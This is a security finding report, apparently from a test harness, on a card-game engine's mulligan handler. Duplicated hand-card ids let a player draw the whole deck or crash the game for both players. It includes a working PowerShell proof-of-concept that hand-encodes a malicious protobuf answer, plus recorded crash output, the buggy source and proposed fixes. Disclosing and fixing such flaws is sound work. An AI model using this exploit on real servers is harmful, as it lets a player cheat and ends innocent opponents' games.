# F-007 — `switchHands` answer is not deduplicated or bounded: draw the whole deck, or kill the game

- **Upstream status: NOT NOVEL — already known/fixed upstream by PR #964 ("fix: fuzz test and bugs"), which registers `switchHands.pile-id` and `switchHands.duplicate-ids` as `must-reject` scenarios in `packages/test/src/fuzz/scenario.ts` and adds the `switchHands` handler that validates them.** This document is kept only as an independent, deployment-reachable confirmation through the live HTTP/SSE API; it is not reported as a new defect.
- **Class**: internal-error (game-engine defect). Acceptance basis: `acceptance.defect.accepted[2]` —
  "the same input produces an internal error that the surrounding code is written to avoid (e.g. a
  crash on a path that is typed as returning a value)". It is **not** an HTTP 5xx: the deployment
  keeps serving, the failure is pushed to both players as an SSE `error` frame and the room dies.
- **Severity**: high (attacker-controlled, deterministic, one request, no race, no auth needed).
- **Route**: `POST /api/rooms` + `POST /api/rooms/:roomId/players` + SSE
  `GET /api/rooms/:roomId/players/:playerId/notification` +
  `POST /api/rooms/:roomId/players/:playerId/actionResponse`.

## Summary

The mulligan RPC `switchHands` returns `removedHandIds`, a *repeated* list of hand-card entity ids.
`Mutator.switchHands()` trusts that list twice and never re-derives the truth from the game state:

```ts
const count = removedHands.length;                 // client-controlled loop bound
const swapInCards = removedHands.map((id) => {
  const card = player().hands.find((c) => c.id === id);
  if (typeof card === "undefined") throw new GiTcgIoError(who, `switchHands return unknown card ${id}`);
  return card;                                     // the SAME EntityState can appear many times
});
...
for (const card of swapInCards) { /* hands -> pile */ }   // duplicate entries move the same card repeatedly

let topIndex = 0;
for (let i = 0; i < count; i++) {                  // runs `count` times, not `distinct` times
  let candidate: EntityState;
  while (topIndex < player().pile.length && swapInCardIds.includes(player().pile[topIndex].definition.id)) topIndex++;
  if (topIndex >= player().pile.length) {
    candidate = player().pile[0];                  // <-- no empty-pile check; `EntityState`, not `| undefined`
  } else {
    candidate = player().pile[topIndex];
  }
  this.mutate({ type: "moveEntity", from: { who, type: "pile", cardId: candidate.id }, ... }); // TypeError here
}
```

Two consequences, both constructive (no fuzzing, both from one request at the mulligan):

1. **Deck-to-hand conversion.** Each loop iteration moves one pile card into the hand, and the loop
   runs `removedHandIds.length` times. The only thing that used to bound it — the 5-card hand — is
   bypassed by sending the same id many times. With 26 copies of one of your own hand ids you start
   the game holding your **entire 30-card deck** (`hand=30, pile=0`), i.e. a free, undetectable
   in-game advantage (the client is *told* `switchHandsDone count=26` but nothing validates it).
2. **Engine crash.** The pile at the mulligan holds `deckSize - initialHandsCount + distinct(removedHandIds)`
   cards (26 for the 30-card deck used here: 25 dealt out + the one card moved in). Every iteration
   consumes exactly one pile card, so iteration `pileLen + 1` reaches `player().pile[0]` on an empty
   pile, `candidate` becomes `undefined`, and `candidate.id` throws
   `TypeError: Cannot read properties of undefined (reading 'id')`.
   The game is destroyed for **both** players (the room stops in `initHands`), and if the attacker
   wants the same input to *not* crash, any `count <= pileLen` silently performs the deck conversion.

Measured threshold for the 30-card deck below (same run, same code path): `count` 1..26 → no error,
hand grows 5 -> 30; `count` 27..30+ → TypeError.

## Reproduction

Requires only the local deployment answering on `http://127.0.0.1:3000` (no auth, no DB access, no
`/api/decks/version`, no other auxiliary route: every call below is on the `@Public()`
`RoomsController`, plus its own SSE stream). Paste the whole block into PowerShell.

```powershell
$ErrorActionPreference = 'Stop'
$base = 'http://127.0.0.1:3000'
$deck = @{
  characters = @(1101,1102,1103)
  cards = @(311101,311102,311103,311104,311105,311106,311107,311108,311109,311110,311111,311112,311201,311202,311203,
            311101,311102,311103,311104,311105,311106,311107,311108,311109,311110,311111,311112,311201,311202,311203)
}

# 1. attacker creates a room, victim joins -> the game starts in the initHands phase
$create = Invoke-RestMethod -Method Post -Uri "$base/api/rooms" -ContentType 'application/json' -Body (@{ name='attacker'; deck=$deck } | ConvertTo-Json -Depth 6)
$roomId = $create.room.id
$tokenA = $create.accessToken
$playerA = $create.playerId
$null = Invoke-RestMethod -Method Post -Uri "$base/api/rooms/$roomId/players" -ContentType 'application/json' -Body (@{ name='victim'; deck=$deck } | ConvertTo-Json -Depth 6)

# 2. our seat ("who") is NOT the join order (Room.players is [participant, host] when hostWho=1)
$info = Invoke-RestMethod -Uri "$base/api/rooms/$roomId"
$who = [array]::IndexOf(@($info.players.id), $playerA)
Write-Host "room=$roomId  our who=$who"

# 3. open our own SSE stream and wait for the first rpc (the mulligan, switchHands, id 0)
$http = [System.Net.Http.HttpClient]::new()
$req = [System.Net.Http.HttpRequestMessage]::new('GET', "$base/api/rooms/$roomId/players/$playerA/notification")
$req.Headers.Add('authorization', "Bearer $tokenA")
$resp = $http.SendAsync($req, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
$reader = [System.IO.StreamReader]::new($resp.Content.ReadAsStream())
$rpcId = $null
while ($null -eq $rpcId) {
  $line = $reader.ReadLine()
  if ($null -eq $line) { throw 'SSE stream ended before any rpc frame' }
  if (-not $line.StartsWith('data:')) { continue }
  $frame = $line.Substring(5).Trim() | ConvertFrom-Json
  if ($frame.type -eq 'rpc' -and $frame.data) { $rpcId = $frame.data.id }
}
Write-Host "got rpc id=$rpcId"

# 4. hand-encode RpcResponse{ switch_hands: { removed_hand_ids: [handId x200] } }
#    proto/rpc.proto: Response.switch_hands = 2 (len-delimited); SwitchHandsResponse.removed_hand_ids = 1 (repeated sint32)
#    hand ids are deterministic for this deck: who0 -> -500003, who1 -> -500003 - (30 cards + 3 characters)
$handId = -500003 - 33 * $who
$zz = [uint64](2 * (-$handId) - 1)                       # zigzag(sint32)
function Varint([uint64]$v) { $b=[System.Collections.Generic.List[byte]]::new(); while ($v -ge 128) { $b.Add([byte]((([int]$v) -band 127) -bor 128)); $v = $v -shr 7 }; $b.Add([byte]$v); $b.ToArray() }
$inner = [System.Collections.Generic.List[byte]]::new()
for ($i = 0; $i -lt 200; $i++) { $inner.Add(0x08); $inner.AddRange([byte[]](Varint $zz)) }      # field 1, 200 entries
$msg = [System.Collections.Generic.List[byte]]::new()
$msg.Add(0x12); $msg.AddRange([byte[]](Varint ([uint64]$inner.Count))); $msg.AddRange($inner)  # field 2
$b64 = [Convert]::ToBase64String($msg.ToArray())

# 5. submit it as our answer to the mulligan
$post = Invoke-WebRequest -Method Post -Uri "$base/api/rooms/$roomId/players/$playerA/actionResponse" -Headers @{ authorization = "Bearer $tokenA" } -ContentType 'application/json' -Body (@{ id=$rpcId; response=$b64 } | ConvertTo-Json -Compress)
Write-Host "POST actionResponse -> $($post.StatusCode)"

# 6. the engine now throws; the server pushes the error to both players over SSE
while ($true) {
  $line = $reader.ReadLine()
  if ($null -eq $line) { Write-Host 'SSE stream ended'; break }
  if (-not $line.StartsWith('data:')) { continue }
  $frame = $line.Substring(5).Trim() | ConvertFrom-Json
  if ($frame.type -eq 'error') { Write-Host "ENGINE ERROR:`n$($frame.message)"; break }
}
$reader.Dispose(); $http.Dispose()
```

Recorded output (5/5 repetitions identical, alternating seats; `who=0` and `who=1` both hit the
error, so the bug is in the shared engine path, not in one seat):

```
room=8770  our who=0
got rpc id=0
POST actionResponse -> 201
ENGINE ERROR:
ZT [Error]: Cannot read properties of undefined (reading 'id')
    when Move entity [equipment:311109](-500029) to hands (-500029) of player 0 (index: end) because switch
    when In initHands phase:
    at new ZT (file:///...packages/server/dist/main.js:475:430)
    at file:///...packages/server/dist/main.js:481:23805
    at process.processTicksAndRejections (node:internal/process/task_queues:104:5) {
  [cause]: TypeError: Cannot read properties of undefined (reading 'id')
      at yO.switchHands (file:///...packages/server/dist/main.js:481:4661)
      at process.processTicksAndRejections (node:internal/process/task_queues:104:5)
      at async Promise.all (index 0)
      at async TO.initHands (file:///...packages/server/dist/main.js:481:25541)
```

The same request with a smaller `removedHandIds` does not error - it converts the deck into the
hand instead. Dump of the attacker's own hand/pile from the SSE `notification` frames, one room per
row (`GET /api/hello` still answers afterwards; the process survives, the *game* does not):

| `removed_hand_ids` | hand at start | hand/pile ~2 s later | engine error |
| --- | --- | --- | --- |
| 1 x own id | 5 / 25 | 10 / 0 | none |
| 5 x own id | 5 / 25 | 10 / 0 | none |
| 10 x own id | 5 / 25 | 14 / 0 | none |
| 20 x own id | 5 / 25 | 24 / 0 | none |
| 26 x own id | 5 / 25 | **30 / 0** (whole deck in hand) | none |
| 30 x own id | 5 / 25 | 5 / 25 | `TypeError: Cannot read properties of undefined (reading 'id')` |

## Buggy code

`packages/core/src/mutator.ts:1307-1375` — the whole function, unedited:

```ts
  async switchHands(who: 0 | 1): Promise<ReadonlyEventList> {
    if (!this.config.howToSwitchHands) {
      throw new GiTcgIoNotProvideError();
    }
    const removedHands = await this.config.howToSwitchHands(who);
    const player = () => this.state.players[who];
    // swapIn: 从手牌到牌堆
    // swapOut: 从牌堆到手牌
    const count = removedHands.length;
    const swapInCards = removedHands.map((id) => {
      const card = player().hands.find((c) => c.id === id);
      if (typeof card === "undefined") {
        throw new GiTcgIoError(who, `switchHands return unknown card ${id}`);
      }
      return card;
    });
    const swapInCardIds = swapInCards.map((c) => c.definition.id);

    const events = new EventList();

    for (const card of swapInCards) {
      const randomValue = this.stepRandom();
      const index = randomValue % (player().pile.length + 1);
      this.mutate({
        type: "moveEntity",
        from: { who, type: "hands", cardId: card.id },
        target: { who, type: "pile", cardId: card.id },
        value: card,
        targetIndex: index,
        reason: "switch",
      });
    }
    // 如果牌堆顶的手牌是刚刚换入的同名牌，那么暂时不选它
    let topIndex = 0;
    for (let i = 0; i < count; i++) {
      let candidate: EntityState;
      while (
        topIndex < player().pile.length &&
        swapInCardIds.includes(player().pile[topIndex].definition.id)
      ) {
        topIndex++;
      }
      if (topIndex >= player().pile.length) {
        // 已经跳过了所有同名牌，只能从头开始
        candidate = player().pile[0];
      } else {
        candidate = player().pile[topIndex];
      }
      this.mutate({
        type: "moveEntity",
        from: { who, type: "pile", cardId: candidate.id },
        target: { who, type: "hands", cardId: candidate.id },
        value: candidate,
        reason: "switch",
      });
      events.push([
        "onHandCardInserted",
        new HandCardInsertedEventArg(
          this.state,
          who,
          candidate,
          "switch",
          false,
        ),
      ]);
    }
    this.notify();
    return events;
  }
```

The caller that feeds it the attacker's list, `packages/core/src/game.ts:1173-1186`:

```ts
  private async rpcSwitchHands(who: 0 | 1) {
    const { removedHandIds } = await this.rpc(who, "switchHands", {});
    this.notifyOne(who, {
      $case: "switchHandsDone",
      who,
      count: removedHandIds.length,
    });
    this.notifyOne(flip(who), {
      $case: "switchHandsDone",
      who,
      count: removedHandIds.length,
    });
    return removedHandIds;
  }
```

and the only validation on the wire is the *shape*, not the content
(`packages/server/src/rooms/rooms.service.ts:288-307`, `receiveResponse()`): it checks the rpc id and
that `response.$case` matches the request's `$case`; nothing looks at the values.

The wire schema is `repeated sint32 removed_hand_ids = 1;` (`proto/rpc.proto:79-81`), so duplicates
and arbitrary length are both legal protobuf.

## Fix

Validate the answer against the state that produced the request, and derive the loop bound from
reality instead of from the client:

```ts
const requested = await this.config.howToSwitchHands(who);
const hands = player().hands;
const seen = new Set<number>();
const swapInCards: EntityState[] = [];
for (const id of requested) {
  if (seen.has(id)) continue;                     // duplicates are meaningless: one card, one move
  seen.add(id);
  const card = hands.find((c) => c.id === id);
  if (typeof card === "undefined") {
    throw new GiTcgIoError(who, `switchHands return unknown card ${id}`);
  }
  swapInCards.push(card);
}
const count = swapInCards.length;                 // == number of distinct cards that can come back
...
      if (topIndex >= player().pile.length) {
        // 已经跳过了所有同名牌：只能从剩下的、未交换过的牌里选
        const restIndex = player().pile.findIndex((c) => !swapInCardIds.includes(c.definition.id));
        if (restIndex < 0) {
          // 牌堆已被抽空（正常对局不可能发生）；安全退出而不是解引用 undefined
          break;
        }
        candidate = player().pile[restIndex];
      } else {
        candidate = player().pile[topIndex];
      }
```

Minimum hardening if a smaller diff is preferred (keeps the current structure but removes both
failure modes):

```ts
const count = Math.min(new Set(removedHands).size, player().pile.length);
...
      if (topIndex >= player().pile.length) {
        if (player().pile.length === 0) break;     // nothing left to swap in
        candidate = player().pile[0];
      }
```

Either way the invariant to restore is: *the number of cards drawn can never exceed the number of
distinct cards the player actually gave back, and the pile is never assumed non-empty.* On the
server side, `rpcSwitchHands()` should also reject an answer whose entries are not a subset of the
`handCard` ids it presented to that player (a request/response pairing the room already has the
state for).

## Principle

This is a **trust-boundary / representation-invariant** bug: the engine treats an attacker-supplied
*list* as if it were a *set* with a length bounded by the data model.

- **Set vs. list.** The hand is a set of at most `initialHandsCount` cards, but `removedHandIds` is
  an unbounded repeated field. `hands.find(c => c.id === id)` maps list *length* to work performed
  while mapping list *elements* to cards, so `count` and the number of distinct cards decouple. The
  invariant `count <= hands.length` is assumed everywhere downstream and never checked.
- **Typed non-nullable, actually nullable.** `let candidate: EntityState;` is a lie under an empty
  pile: control flow (`pile[topIndex]` guarded by `topIndex < pile.length`, else `pile[0]`) reads as
  total, but `pile[0]` on an empty array is `undefined`. The type checker cannot help because the
  array element type is declared non-optional; only a runtime bound (or `noUncheckedIndexedAccess`)
  exposes it. That is exactly the `acceptance.defect.accepted[2]` clause: a crash on a path typed as
  returning a value.
- **Consume-then-recompute.** Because each loop iteration removes one pile card, the loop's own
  writes change the predicate (`player().pile.length`) it is looping on; the loop bound and the
  shrinking collection are the same object. Client-controlled bounds plus a self-mutating condition
  is what turns a "draw N cards" helper into an out-of-bounds read.
- **Blast radius.** The throw happens inside `Promise.all([switchHands(0), switchHands(1)])` in
  `initHands()`, so it is not the attacker's game that dies: the room stops before either player
  plays a single turn, and the *innocent* opponent loses the game too. Nothing in the deployment
  (rate limit, room accounting, replay) treats "a game crashed on a client-supplied RPC value" as
  worth alerting on - the crash is only visible to the two clients as an SSE `error` frame.

## Server not running yet?

The block needs the deployment up on `http://127.0.0.1:3000`. From the repository root:

```powershell
node security-harness\.run\restart.mjs      # HARNESS_MODE=dist, waits until /api/hello answers
(Invoke-WebRequest -Uri http://127.0.0.1:3000/api/hello -UseBasicParsing).Content   # "Hello World!"
```

## Harness bookkeeping (not needed to reproduce)

- Contract probe: `S7` (`probes/S7-switchhands-duplicate-ids.probe.mjs`), `expect: internal-error`,
  `expectAfterFix: handled`.
- Registered as finding `F-007` in `security-harness/contract.json`; catalogue line in `REPORT.md`.
- Raw evidence (SSE frames, per-case hand/pile dumps, server-log excerpt): run
  `node security-harness/cli.mjs probe S7` and read `security-harness/evidence/<runId>/`.
